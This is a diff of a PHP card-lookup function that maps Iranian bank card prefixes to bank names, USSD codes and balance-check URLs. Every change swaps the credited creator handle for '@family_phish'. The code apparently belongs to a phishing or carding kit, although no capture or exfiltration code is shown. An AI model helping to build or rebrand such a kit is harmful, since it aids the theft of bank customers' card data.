@@ -21,7 +21,7 @@ function bank_information($cardn){
 📱 Ussd : *717#  
 ☎️ TBank : 09622
 ------------- Creator -------------
-🆔 : @fuckingdargah :)
+🆔 : @family_phish :)
 🌐 Webhost : @XTuranli :)";
       }elseif ($cardn == 589210) {
         $bankname = "SEPAH";
@@ -29,14 +29,14 @@ function bank_information($cardn){
 🌐 Website : https://ib.ebanksepah.ir/desktop/sepahPages/shetabCard.sepah
 ☎️ TBank : 021 64058
 ------------- Creator -------------
-🆔 : @fuckingdargah :)
+🆔 : @family_phish :)
 🌐 Webhost : @XTuranli :)";
       }elseif ($cardn == 627648 || $cardn == 207177) {
         $bankname = "TOSEE SADERAT";
         $bankinfo = "
 ☎️ TBank : 021 2722
 ------------- Creator -------------
-🆔 : @fuckingdargah :)
+🆔 : @family_phish :)
 🌐 Webhost : @XTuranli :)";
       }elseif ($cardn == 627961) {
         $bankname = "SANAT MADAN";
@@ -44,7 +44,7 @@ function bank_information($cardn){
 📱 Ussd : *719#
 ☎️ TBank : 021 75024
 ------------- Creator -------------
-🆔 : @fuckingdargah :)
+🆔 : @family_phish :)
 🌐 Webhost : @XTuranli :)";
       }elseif ($cardn == 603770 || $cardn == 639217) {
         $bankname = "KESHAVARZI";
@@ -53,7 +53,7 @@ function bank_information($cardn){
 📱 Ussd : *730#
 ☎️ TBank : 09603
 ------------- Creator -------------
-🆔 : @fuckingdargah :)
+🆔 : @family_phish :)
 🌐 Webhost : @XTuranli :)";
       }elseif ($cardn == 628023) {
         $bankname = "MASKAN";
@@ -61,7 +61,7 @@ function bank_information($cardn){
 📱 Ussd : *714#, *737#
 ☎️ TBank : 021 64096
 ------------- Creator -------------
-🆔 : @fuckingdargah :)
+🆔 : @family_phish :)
 🌐 Webhost : @XTuranli :)";
       }elseif ($cardn == 627760) {
         $bankname = "POSTBANK";
@@ -69,14 +69,14 @@ function bank_information($cardn){
 📱 Ussd : *747#
 ☎️ TBank : 021 84284
 ------------- Creator -------------
-🆔 : @fuckingdargah :)
+🆔 : @family_phish :)
 🌐 Webhost : @XTuranli :)";
       }elseif ($cardn == 502908) {
         $bankname = "TOSEE TAAVON";
         $bankinfo = "
 🌐 Website : https://epayment.ttbank.ir
 ------------- Creator -------------
-🆔 : @fuckingdargah :)
+🆔 : @family_phish :)
 🌐 Webhost : @XTuranli :)";
       }elseif ($cardn == 627412) {
         $bankname = "EGHTESAD NOVIN";
@@ -84,7 +84,7 @@ function bank_information($cardn){
 🌐 Website : https://modern.enbank.net/CustomerManager/viewLogin.html
 ☎️ TBank : 021 85292
 ------------- Creator -------------
-🆔 : @fuckingdargah :)
+🆔 : @family_phish :)
 🌐 Webhost : @XTuranli :)";
       }elseif ($cardn == 622106 || $cardn == 639194 || $cardn == 627884) {
         $bankname = "PARSIAN";
@@ -92,7 +92,7 @@ function bank_information($cardn){
 📱 Ussd : *708#
 ☎️ TBank : 021 89111
 ------------- Creator -------------
-🆔 : @fuckingdargah :)
+🆔 : @family_phish :)
 🌐 Webhost : @XTuranli :)";
       }elseif ($cardn == 502229 || $cardn == 639347) {
         $bankname = "PASARGAD";
@@ -101,14 +101,14 @@ function bank_information($cardn){
 📱 Ussd : *720#
 ☎️ TBank : 021 828991111
 ------------- Creator -------------
-🆔 : @fuckingdargah :)
+🆔 : @family_phish :)
 🌐 Webhost : @XTuranli :)";
       }elseif ($cardn == 627488 || $cardn == 502910) {
         $bankname = "KARAFARIN";
         $bankinfo = "
 ☎️ TBank : 021 23640
 ------------- Creator -------------
-🆔 : @fuckingdargah :)
+🆔 : @family_phish :)
 🌐 Webhost : @XTuranli :)";
       }elseif ($cardn == 621986) {
         $bankname = "SAMAN";
@@ -116,7 +116,7 @@ function bank_information($cardn){
 📱 Ussd : *724#
 ☎️ TBank : 021 6422
 ------------- Creator -------------
-🆔 : @fuckingdargah :)
+🆔 : @family_phish :)
 🌐 Webhost : @XTuranli :)";
       }elseif ($cardn == 639346) {
         $bankname = "SINA";
@@ -125,7 +125,7 @@ function bank_information($cardn){
 📱 Ussd : *727#
 ☎️ TBank : 021 82487
 ------------- Creator -------------
-🆔 : @fuckingdargah :)
+🆔 : @family_phish :)
 🌐 Webhost : @XTuranli :)";
       }elseif ($cardn == 639607) {
         $bankname = "SARMAYE";
@@ -133,7 +133,7 @@ function bank_information($cardn){
 🌐 Website : https://pg.sbank.ir/balanceRequest.do
 ☎️ TBank : 021 8254
 ------------- Creator -------------
-🆔 : @fuckingdargah :)
+🆔 : @family_phish :)
 🌐 Webhost : @XTuranli :)";
       }elseif ($cardn == 636214) {
         $bankname = "AYANDE";
@@ -141,7 +141,7 @@ function bank_information($cardn){
 📱 Ussd : *745#
 ☎️ TBank : 021 2957
 ------------- Creator -------------
-🆔 : @fuckingdargah :)
+🆔 : @family_phish :)
 🌐 Webhost : @XTuranli :)";
       }elseif ($cardn == 502806 || $cardn == 504706) {
         $bankname = "SHAHR";
@@ -150,14 +150,14 @@ function bank_information($cardn){
 📱 Ussd : *787#
 ☎️ TBank : 021 87611
 ------------- Creator -------------
-🆔 : @fuckingdargah :)
+🆔 : @family_phish :)
 🌐 Webhost : @XTuranli :)";
       }elseif ($cardn == 502938) {
         $bankname = "DAY";
         $bankinfo = "
 ☎️ TBank : 021 2726
 ------------- Creator -------------
-🆔 : @fuckingdargah :)
+🆔 : @family_phish :)
 🌐 Webhost : @XTuranli :)";
       }elseif ($cardn == 603769) {
         $bankname = "SADERAT";
@@ -165,7 +165,7 @@ function bank_information($cardn){
 📱 Ussd : *719#
 ☎️ TBank : 09602
 ------------- Creator -------------
-🆔 : @fuckingdargah :)
+🆔 : @family_phish :)
 🌐 Webhost : @XTuranli :)";
       }elseif ($cardn == 610433 || $cardn == 991975) {
         $bankname = "MELLAT";
@@ -173,7 +173,7 @@ function bank_information($cardn){
 📱 Ussd : *720#
 ☎️ TBank : 021 8132
 ------------- Creator -------------
-🆔 : @fuckingdargah :)
+🆔 : @family_phish :)
 🌐 Webhost : @XTuranli :)";
       }elseif ($cardn == 585983) {
         $bankname = "TEJARAT";
@@ -181,7 +181,7 @@ function bank_information($cardn){
 🌐 Website : https://pg.tejaratbank.ir/paymentGateway/getBalance
 ☎️ TBank : 021 81277
 ------------- Creator -------------
-🆔 : @fuckingdargah :)
+🆔 : @family_phish :)
 🌐 Webhost : @XTuranli :)";
       }elseif ($cardn == 589463) {
         $bankname = "REFAH";
@@ -189,7 +189,7 @@ function bank_information($cardn){
 📱 Ussd : *729#
 ☎️ TBank : 021 84043000
 ------------- Creator -------------
-🆔 : @fuckingdargah :)
+🆔 : @family_phish :)
 🌐 Webhost : @XTuranli :)";
       }elseif ($cardn == 627381) {
         $bankname = "ANSAR";
@@ -198,28 +198,28 @@ function bank_information($cardn){
 📱 Ussd : *763#
 ☎️ TBank : 021 48049
 ------------- Creator -------------
-🆔 : @fuckingdargah :)
+🆔 : @family_phish :)
 🌐 Webhost : @XTuranli :)";
       }elseif ($cardn == 505785) {
         $bankname = "IRAN ZAMIN";
         $bankinfo = "
 ☎️ TBank : 021 24760
 ------------- Creator -------------
-🆔 : @fuckingdargah :)
+🆔 : @family_phish :)
 🌐 Webhost : @XTuranli :)";
       }elseif ($cardn == 636795) {
         $bankname = "MARKAZI";
         $bankinfo = "
 📜 No Info!
 ------------- Creator -------------
-🆔 : @fuckingdargah :)
+🆔 : @family_phish :)
 🌐 Webhost : @XTuranli :)";
       }elseif ($cardn == 636949) {
         $bankname = "HEKMAT";
         $bankinfo = "
 ☎️ TBank : 021 89555
 ------------- Creator -------------
-🆔 : @fuckingdargah :)
+🆔 : @family_phish :)
 🌐 Webhost : @XTuranli :)";
       }elseif ($cardn == 505416) {
         $bankname = "GARDESHGARI";
@@ -228,7 +228,7 @@ function bank_information($cardn){
 📱 Ussd : *764#
 ☎️ TBank : 021 22630345
 ------------- Creator -------------
-🆔 : @fuckingdargah :)
+🆔 : @family_phish :)
 🌐 Webhost : @XTuranli :)";
       }elseif ($cardn == 606373) {
         $bankname = "QARZOLHASANE";
@@ -236,14 +236,14 @@ function bank_information($cardn){
 🌐 Website : https://epayment.rqb.ir/BalanceInquiry.aspx
 ☎️ TBank : 021 8528
 ------------- Creator -------------
-🆔 : @fuckingdargah :)
+🆔 : @family_phish :)
 🌐 Webhost : @XTuranli :)";
       }elseif ($cardn == 628157) {
         $bankname = "MOESSE TOSEE";
         $bankinfo = "
 ☎️ TBank : 021 81461
 ------------- Creator -------------
-🆔 : @fuckingdargah :)
+🆔 : @family_phish :)
 🌐 Webhost : @XTuranli :)";
       }elseif ($cardn == 505801) {
         $bankname = "KOSAR";
@@ -251,7 +251,7 @@ function bank_information($cardn){
 📱 Ussd : *744#
 ☎️ TBank : 021 86777
 ------------- Creator -------------
-🆔 : @fuckingdargah :)
+🆔 : @family_phish :)
 🌐 Webhost : @XTuranli :)";
       }elseif ($cardn == 639370) {
         $bankname = "MOSSE MEHR";
@@ -259,21 +259,21 @@ function bank_information($cardn){
 🌐 Website : https://modern.qmbi24.com/customermngr/viewLogin.html
 ☎️ TBank : 021 8989
 ------------- Creator -------------
-🆔 : @fuckingdargah :)
+🆔 : @family_phish :)
 🌐 Webhost : @XTuranli :))";
       }elseif ($cardn == 639599) { 
         $bankname = "QAVAMIN";
         $bankinfo = "
 ☎️ TBank : 021 84270
 ------------- Creator -------------
-🆔 : @fuckingdargah :)
+🆔 : @family_phish :)
 🌐 Webhost : @XTuranli :)";
       }else{
         $bankname = "#FAKE";
         $bankinfo = "
 		CARDFAKE!
 		------------- Creator -------------
-🆔 : @fuckingdargah :)
+🆔 : @family_phish :)
 🌐 Webhost : @XTuranli :)";
     
       }
